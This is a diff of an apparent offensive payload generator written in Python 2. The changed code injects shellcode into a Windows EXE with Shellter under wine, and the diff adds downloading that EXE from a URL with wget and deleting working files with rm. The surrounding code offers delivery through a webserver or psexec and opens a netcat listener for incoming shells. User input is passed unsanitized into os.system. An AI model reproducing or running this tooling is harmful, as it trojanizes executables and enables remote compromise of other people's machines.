@@ -420,7 +420,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
     if want_to_payloadinexe.lower() == 'y':
         payloadinexe_payloadname = raw_input(
-            '[*] EXE Filepath: ')
+            t.bold_green + '[*] EXE Filepath or URL to EXE: ' + t.normal)
         os.chdir(os.getcwd() + '/shellter')
         try:
             os.mkdir('compiled')
@@ -429,13 +429,21 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
         with open('payloadbin', 'wb') as Csave:
             Csave.write(shellcode)
             Csave.close()
-            payloadinexe_payloadnameshort = re.search(
-                '\w+\.exe$', payloadinexe_payloadname)
+        payloadinexe_payloadnameshort = re.search('\w+\.exe$', payloadinexe_payloadname)
+        if re.search('(http:\/\/|https:\/\/)',payloadinexe_payloadname):
+            os.system('wget ' + payloadinexe_payloadname)
+            payloadinexe_payloadname = payloadinexe_payloadnameshort.group(0)
         os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
                   payloadinexe_payloadname)
         os.system('mv %s ./compiled/%s' %
                   (payloadinexe_payloadname, payloadinexe_payloadnameshort.group(0)))
-
+        try:
+            os.system('rm ' + payloadinexe_payloadnameshort.group(0))
+            os.system('rm ' + payloadinexe_payloadnameshort.group(0) + '.bak')
+            os.system('rm payloadbin')
+        except:
+            pass
+            
     want_to_upload = raw_input(
         '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
     if want_to_upload.lower() == 'y' or want_to_upload == '':
@@ -479,7 +487,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
             b.daemon = True
             b.start()
         else:
-            print t.bold_red + '[*] Install Impacket for Python From Git!' + t.normal
+            print t.bold_red + '[*] Install Impacket for Python from Git!' + t.normal
 
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
